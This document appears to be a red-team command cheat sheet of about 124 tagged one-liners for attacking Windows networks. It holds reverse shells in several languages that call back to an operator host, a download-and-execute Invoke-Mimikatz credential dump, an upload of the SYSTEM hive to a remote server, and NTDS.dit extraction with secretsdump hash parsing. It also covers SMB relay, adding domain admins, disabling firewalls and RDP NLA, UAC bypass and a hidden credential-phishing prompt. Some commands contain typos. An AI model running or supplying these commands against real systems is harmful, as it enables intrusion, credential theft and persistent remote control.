### 1. perl reverse shell
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**- linux,reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**- linux,reverse shells,Windows,python**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 3. php reverse shell : php from the CLI
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**- linux,reverse shells,Windows,php**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 4. ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
**- linux,reverse shells,Windows,ruby**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 5. net cat reverse shell
```
nc -e /bin/sh 10.0.0.1 1234
```
**- linux,reverse shells,Windows**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 6. list windows services
```
net start
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
__________
### 7. list windows password requirements : add /domain for AD
```
net accounts
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
__________
### 8. password requirements domain
```
net accounts /domain
```
**- enumeration,Windows,users**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
__________
### 9. Yaps windows portscan, upload first duh
```
yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n
```
**- networking,scanning,Windows**
#### References:

http://www.steelbytes.com/?mid=19
__________
### 10. Windows run as
```
runas /user:[DOM]\[USER] [EXE]
```
**- Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490994.aspx
__________
### 11. Priv esc check weak service perms, you may need an older version for older windows!
```
accesschk.exe -uwcqv "Authenticated Users" *
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx
__________
### 12. powershell bypass block
```
Set-ExecutionPolicy unrestricted
```
**- Windows,powershell**
#### References:

https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
__________
### 13. powershell bypass block
```
powershell.exe -noprofile -executionpolicy bypass
```
**- Windows,powershell**
#### References:

https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
__________
### 14. Invoke mimicatz, can use with psexec for pwnage
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
```
**- passwords,Windows,av evasion,powershell**
#### References:

http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
__________
### 15. Dump a processes memory for offline abuse
```
procdump.exe -accepteula -ma keepass.exe keepass.dmp
```
**- Windows,memory**
#### References:

https://sourceforge.net/p/keepass/feature-requests/1907/
__________
### 16. Powershell password last changed, run on DC
```
Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://yg.ht
https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 17. dump dns zone on DC
```
dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone
```
**- enumeration,dns,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/cc772069(v=ws.11).aspx
__________
### 18. Recover IIS password
```
c:\windows\system32\inetsrv\appcmd.exe list apppool "SharePoint Central Administration v4" /text:ProcessModel.Password
```
**- passwords,enumeration,Windows,IIS**
#### References:

https://yg.ht
https://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
__________
### 19. get domain trusts
```
netdom query trust
```
**- enumeration,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/cc772217(v=ws.11).aspx
__________
### 20. show native port forwards windows
```
netsh interface portproxy show all
```
**- networking,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 21. set native port forward windows
```
netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip]
```
**- networking,pivoting,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 22. reset native port forward windows
```
netsh interface portproxy reset
```
**- networking,pivoting,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 23. windows firewall status
```
sc query "MpsSvc"
```
**- enumeration,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-gb/library/bb490995.aspx
https://technet.microsoft.com/en-us/library/dd228922(v=ws.11).aspx
__________
### 24. windows firewall status
```
netsh advfirewall firewall
```
**- enumeration,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 25. Windows process list
```
tasklist /v
```
**- enumeration,Windows,process management,privilege escalation**
#### References:

https://technet.microsoft.com/en-gb/library/bb491010.aspx
__________
### 26. Windows force kill process
```
taskkill /f /im [PROCESS]
```
**- Windows,process management**
#### References:

https://technet.microsoft.com/en-gb/library/bb491010.aspx
__________
### 27. Windows list listening ports
```
netstat -a | find "LISTENING"
```
**- networking,enumeration,Windows**
#### References:

http://Microsoft.com
__________
### 28. Windows open files
```
tasklist /FI "IMAGENAME eq [process].exe" /V
```
**- files,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491010.aspx
__________
### 29. ByPassUAC
```
bypassuac.exe /c [COMMAND]
```
**- Windows**
#### References:

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac.rb
__________
### 30. Scheduled cmd to run
```
at [TIME] command.exe /s cmd SYSCMD
```
**- linux,bash,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490866.aspx
https://www.lifewire.com/linux-command-at-4091646
__________
### 31. Unquoted Service Paths
```
wmic service get name,displayname,pathname,startmode
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 32. Unquoted Service Paths
```
sc query
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 33. Unquoted Service Paths
```
sc qc "[SERVICE]"
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 34. Unquoted Service Paths, start service
```
sc config "[SERVICE]" start= auto
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 35. Unquoted Service Paths
```
sc config "[SERVICE]" start= disabled
```
**- enumeration,Windows**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 36. VBA launching command
```
Sub Test();Shell ("powershell");End Sub
```
**- Windows**
#### References:

https://yg.ht
https://support.smartbear.com/testcomplete/docs/testing-with/advanced/using-external-functions/running-powershell-scripts.html
__________
### 37. Javascript wget windows oneline : cscript /nologo wget.js http://[IP]
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("out.exe");>wget.js
```
**- pivoting,files,Windows**
#### References:

http://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-is-doing
__________
### 38. Windows Wireless
```
netsh wlan show profile
```
**- networking,passwords,enumeration,Windows,wireless,wifi**
#### References:

http://Microsoft.com
__________
### 39. Windows Wireless
```
netsh wlan show profile name="[SSID]" key=clear
```
**- networking,passwords,Windows,wireless,wifi**
#### References:

https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 40. Cat for windows
```
type [FILE]
```
**- files,Windows**
#### References:

https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/type.mspx?mfr=true
__________
### 41. Domain Admins windows
```
net group "Domain Admins" /domain
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 42. KeePass2 Cracking
```
wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx
```
**- linux,passwords,Windows,cracking**
#### References:

https://yg.ht
http://www.cervezhack.fr/2013/02/12/bruteforce-a-keepass-file/?lang=en
__________
### 43. Windows ARP Cache
```
ipconfig /displaydns
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 44. Add a domain user from the CLI
```
net user [user] [pass] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc771865(v=ws.11).aspx
__________
### 45. Add [User] to the domain admins group
```
net group "Domain Admins" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 46. Add user to enterprise admins
```
net group "Enterprise Admins" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 47. Add user to the RDP group
```
net localgroup "Remote Desktop Users" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 48. Add a user to the local admin group, not as useful any more
```
net localgroup "Administrators" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 49. Word list generator
```
./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3
```
**- linux,passwords,Windows,cracking**
#### References:

https://hashcat.net/wiki/doku.php?id=maskprocessor
__________
### 50. Word list generator
```
/data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic
```
**- linux,Windows,cracking**
#### References:

https://yg.ht
https://hashcat.net/wiki/doku.php?id=maskprocessor
__________
### 51. smbrelay targeted
```
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 52. smbrelay reflection : note read into http -> smb refelction
```
smbrelayx.py -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 53. Telnet Mail
```
telnet [IP] 25
```
**- linux,networking,Windows**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 54. hashcat cpu
```
./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc]
```
**- linux,Windows,cracking**
#### References:

https://hashcat.net/wiki/
__________
### 55. perl windows reverse shell
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[me]:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
**- reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 56. system information
```
ver
```
**- enumeration,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb491028.aspx
__________
### 57. remote system info
```
systeminfo /S [victim] /U [domain]/[user] /P [pass]
```
**- enumeration,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-gb/library/bb491007.aspx
__________
### 58. list drives
```
fsutil fsinfo drives
```
**- Windows,forensics**
#### References:

https://technet.microsoft.com/en-us/library/cc753059(v=ws.11).aspx
__________
### 59. search for text in the reg
```
reg query HKLM /f [text]  /t REG SZ /s
```
**- enumeration,Windows,privilege escalation,forensics**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-us/library/cc742028(v=ws.11).aspx
__________
### 60. grep for text in files
```
findstr /si [text] '.txt|xml|xls'
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-gb/library/bb490907.aspx
__________
### 61. show hosts in the current domain or add a domain for searching
```
net view /domain
```
**- networking,enumeration,dns,Windows,recon**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490719.aspx
__________
### 62. current smb shares
```
net share
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
__________
### 63. active sessions
```
net session
```
**- enumeration,smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
__________
### 64. Share a directory with the world, probably don't want the world
```
net share [sharename] [folder] /GRANT:Everyone,FULL
```
**- files,smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
__________
### 65. Create a service on remote machine
```
sc \\[victim] create [name] binpath=[pathtoexe] start= auto
```
**- Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490995.aspx
https://technet.microsoft.com/en-us/library/cc990289(v=ws.11).aspx
__________
### 66. copy a remote file to lcwd
```
xcopy /s \\[victim] \dir [directory]
```
**- files,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491035.aspx
__________
### 67. remote shutdown : /i as first option for gui
```
shutdown /m \\[victim] /r /t 0 /f
```
**- Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491003.aspx
__________
### 68. show dnscache
```
ipconfig /displaydns
```
**- networking,enumeration,dns,Windows,forensics**
#### References:

https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 69. listening ports
```
netstat -anop | findstr LISTEN
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc940097.aspx
https://technet.microsoft.com/en-us/library/bb490947.aspx
__________
### 70. download a file, no longer default
```
tftp -I [victim] GET [file]
```
**- files,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491014.aspx
__________
### 71. show interface information
```
netsh interface ip show
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 72. set static ip
```
netsh interface ip set address local static [ip] [mask] [gw] [ID]
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 73. set DNS server
```
netsh interface ip set dns local static [ip]
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 74. enable DHCP
```
netsh interface ip set address local dhcp
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 75. compress file
```
makecab [file]
```
**- files,Windows**
#### References:

https://technet.microsoft.com/en-us/library/hh875545(v=ws.11).aspx
__________
### 76. uninstall patch : 2871997
```
wusa.exe /uninstall /kb: [id]
```
**- interesting,Windows**
#### References:

https://support.microsoft.com/en-gb/help/934307/description-of-the-windows-update-standalone-installer-in-windows
__________
### 77. lock the workstation
```
rundll32.dll user32.dll LockWorkstation
```
**- interesting,Windows**
#### References:

https://technet.microsoft.com/en-us/library/ee649171(v=ws.11).aspx
__________
### 78. disable local firewall
```
netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off;
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx
__________
### 79. re-enable CMD
```
reg add HKCU\Software\Policies\microsoft\Windows\System /v DisableCHD /t
```
**- pivoting,Windows,configuration**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 80. windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash
```
psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file]
```
**- pivoting,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx
__________
### 81. enable RDP
```
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer" /v DenyTSConnections /t REG_DWORD /d 0 /f
```
**- Windows,configuration**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 82. Disable NLA on RDP
```
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
```
**- Windows,configuration**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 83. start wmic service
```
wmic startupwmic service
```
**- Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 84. list all processes
```
wmic process list full
```
**- Windows,process management**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 85. Domain and DC info
```
wmic ntdomain list
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 86. list patches
```
wmic qfe
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 87. execute command
```
wrnic process call create "[cmd]"
```
**- Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 88. kill process
```
wmic process where name="[cmd]" call terminate
```
**- Windows,process management**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 89. view logical shares
```
wmic logicaldisk get description,name
```
**- enumeration,Windows,filesystem**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 90. execute command on remote host from remote smb share
```
wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create "\\[host]\[share]\[exe]"
```
**- smb,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 91. get logged in users from the remote host
```
wmic /node:[victim] computersystern get username
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 92. list remote processes every second
```
wmic /node:[victim] process list brief /every:1
```
**- enumeration,Windows,process management**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 93. enble rdp on remote host
```
wmic /node:"[victim]" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
```
**- Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 94. How many times has someone logged in
```
wmic netlogin where (name like "%[user]%") get numberoflogons
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 95. unquoted service path search add node for remote sys
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
```
**- enumeration,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 96. List volume shadow copies
```
wmic /node:[victim] /user:"[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin list shadows 2 &1 >> c:\temp\vss.txt"
```
**- Windows,hashes**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 97. create volume shadow copy for c
```
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\temp\create_vss.txt"
```
**- Windows,hashes**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 98. copy system out of a volume shadow copy
```
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\Windows\System32\config\SYSTEM c:\temp\SYSTEM" 2 &1 >> c:\temp\copy_system.txt
```
**- Windows,hashes**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 99. copy out ntds from the voulme shadow copy
```
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\NTDS\NTDS.dit c:\temp\ntds.dit" 2 &1 >> c:\temp\copy_ntds.txt
```
**- Windows,hashes**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 100. Parse the SYSTEM and ntds with impacket
```
secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes
```
**- Windows,impacket,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 101. powershell wget
```
invoke-webrequest
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 102. also powershell wget
```
wget
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 103. also powershell wget
```
(new-object system.net.webclient).downloadFile("[url]","[dest]")
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 104. powershell type file
```
get-content
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-content
__________
### 105. powershell services
```
get-service
```
**- Windows,powershell,process management**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-service
__________
### 106. list of drives : cd Env:\ . . . mind . . . blown
```
get-psdrive
```
**- enumeration,interesting,Windows,configuration,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-psdrive
__________
### 107. RTFM *cough*
```
get-help
```
**- Windows,powershell**
#### References:

https://technet.microsoft.com/en-us/library/ee176848.aspx
__________
### 108. list interfaces with wmi
```
get-wmiobject -list 'netework'
```
**- Windows,powershell**
#### References:

https://technet.microsoft.com/en-us/library/ee176860.aspx
https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-wmiobject
__________
### 109. get dns addr tab after :: for more choices
```
[Net.DNS]::GetHostEntry("ip")
```
**- dns,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/ms143998(v=vs.110).aspx
__________
### 110. get system information
```
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
```
**- enumeration,Windows,powershell**
#### References:

http://www.energizedtech.com/2010/03/powershell-check-your-windows.html
__________
### 111. powershell mount remote share : think sysinternals remote share
```
New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
```
**- files,smb,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/new-psdrive
__________
### 112. txt files changed after the 13 Jan 2017
```
Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2017-01-13"}
```
**- files,Windows,powershell,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 113. powershell port scanning
```
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
```
**- networking,loop,interesting,scanning,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 114. Ping ip with timeout of 500
```
$ping = New-Object System.Net.Networkinformation.ping;$ping.Send("[ip]",50O);
```
**- networking,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 115. Ask user for credentials
```
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("[title]","[message]","[user]","[domain]")
```
**- passwords,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 116. powershell run on schedule, match says when run
```
powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden "[exe]";Start-Sleep -s 14400}}while(1)"
```
**- Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 117. Powershell send an email
```
powershell.exe Send-MailMessage -to "[victim]" -from "[from]" -subject "[subject]" -a "[Attach file path]" -body "[Body]" -SmtpServer [ServerIP]
```
**- interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 118. list hostname and ip for domain pc's
```
Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter "domainname='[domain]' | select textrepresentation
```
**- enumeration,dns,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 119. Powershell upload file VIA post, script must write this out
```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
```
**- networking,files,interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 120. Windows information in the reg
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion
```
**- enumeration,Windows,forensics**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 121. Mapped drives in reg
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU
```
**- enumeration,smb,Windows,forensics**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 122. Mounted devices
```
HKLM\System\MountedDevices
```
**- Windows,forensics**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 123. USB Devices
```
HKLM\System\CurrentControlSet\Enum\USBStor
```
**- Windows,forensics**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 124. enable ip routing in windows, use as GW
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter
```
**- Windows,configuration**
#### References:

